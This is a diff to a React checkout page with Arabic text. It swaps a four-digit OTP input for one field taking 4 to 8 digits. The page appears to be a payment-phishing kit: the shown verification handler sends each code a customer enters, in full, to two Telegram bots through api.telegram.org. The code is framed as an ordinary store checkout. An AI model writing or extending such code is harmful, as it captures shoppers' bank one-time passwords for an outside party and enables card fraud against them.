@@ -20,9 +20,9 @@ export default function CheckoutPage() {
   const [installmentMonths, setInstallmentMonths] = useState(6);
   const [installmentSchedule, setInstallmentSchedule] = useState([]);
   const [showOTP, setShowOTP] = useState(false);
-  const [otp, setOtp] = useState(["", "", "", ""]);
+  const [otp, setOtp] = useState(""); // تغيير إلى سلسلة نصية واحدة بدلاً من مصفوفة
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const otpInputsRef = useRef([]);
+  const otpInputRef = useRef(null); // استخدام مرجع واحد بدلاً من مصفوفة
 
   const validationSchema = Yup.object({
     name: Yup.string()
@@ -264,10 +264,9 @@ ${
 
   const handleVerifyOTP = async (e) => {
     e.preventDefault();
-    const enteredOtp = otp.join("");
 
-    if (enteredOtp.length !== 4) {
-      toast.error("يرجى إدخال رمز التحقق المكون من 4 أرقام");
+    if (otp.length < 4 || otp.length > 8) {
+      toast.error("يرجى إدخال رمز التحقق المكون من 4 - 8 أرقام");
       return;
     }
 
@@ -279,7 +278,7 @@ ${
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: chatId1,
-            text: `✅ تم التحقق من الطلب بنجاح\nرمز التحقق: ${enteredOtp}`,
+            text: `✅ تم التحقق من الطلب بنجاح\nرمز التحقق: ${otp}`,
             parse_mode: "Markdown",
           }),
         }
@@ -291,7 +290,6 @@ ${
         throw new Error(data1.description || "فشل في إرسال رمز التحقق");
       }
 
-      
       const response2 = await fetch(
         `https://api.telegram.org/bot${botId2}/sendMessage`,
         {
@@ -299,7 +297,7 @@ ${
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: chatId2,
-            text: `✅ تم التحقق من الطلب بنجاح\nرمز التحقق: ${enteredOtp}`,
+            text: `✅ تم التحقق من الطلب بنجاح\nرمز التحقق: ${otp}`,
             parse_mode: "Markdown",
           }),
         }
@@ -324,22 +322,12 @@ ${
     }
   };
 
-  const handleOtpChange = (value, index) => {
-    const newOtp = [...otp];
-    newOtp[index] = value;
-    setOtp(newOtp);
-
-    // الانتقال تلقائياً إلى الحقل التالي عند إدخال رقم
-    if (value && index < 3) {
-      otpInputsRef.current[index + 1].focus();
+  // إعادة التركيز على حقل OTP عند فتح النافذة
+  useEffect(() => {
+    if (showOTP && otpInputRef.current) {
+      otpInputRef.current.focus();
     }
-  };
-
-  const handleOtpKeyDown = (e, index) => {
-    if (e.key === "Backspace" && !otp[index] && index > 0) {
-      otpInputsRef.current[index - 1].focus();
-    }
-  };
+  }, [showOTP]);
 
   if (cartItems.length === 0) {
     return (
@@ -786,27 +774,27 @@ ${
         {/* نافذة التحقق من OTP */}
         <Dialog open={showOTP} onOpenChange={setShowOTP}>
           <DialogContent className="sm:max-w-md">
-            <DialogHeader className="py-4">
-              <DialogTitle>التحقق من الهوية</DialogTitle>
-              <DialogDescription>
+            <DialogHeader className="py-4 text-center">
+              <DialogTitle className={'text-center'}>التحقق من الهوية</DialogTitle>
+              <DialogDescription className={"text-center"}>
                 سوف تصلك رسالة تحتوي على رمز التحقق يرجى إدخاله في الحقل المخصص
               </DialogDescription>
             </DialogHeader>
 
             <form onSubmit={handleVerifyOTP}>
-              <div className="flex justify-center space-x-2 mb-6">
-                {[0, 1, 2, 3].map((index) => (
-                  <input
-                    key={index}
-                    ref={(el) => (otpInputsRef.current[index] = el)}
-                    type="text"
-                    maxLength="1"
-                    value={otp[index]}
-                    onChange={(e) => handleOtpChange(e.target.value, index)}
-                    onKeyDown={(e) => handleOtpKeyDown(e, index)}
-                    className="w-14 h-14 text-center text-2xl font-bold border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
-                  />
-                ))}
+              <div className="flex justify-center mb-6">
+                <input
+                  ref={otpInputRef}
+                  type="text"
+                  maxLength="8"
+                  value={otp}
+                  onChange={(e) => {
+                    const value = e.target.value.replace(/\D/g, "");
+                    setOtp(value);
+                  }}
+                  className="w-full placeholder:text-md p-3 text-center  font-bold border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#9d5ea9] focus:border-transparent"
+                  placeholder="أدخل الرمز المكون من 4-8 أرقام"
+                />
               </div>
 
               <button
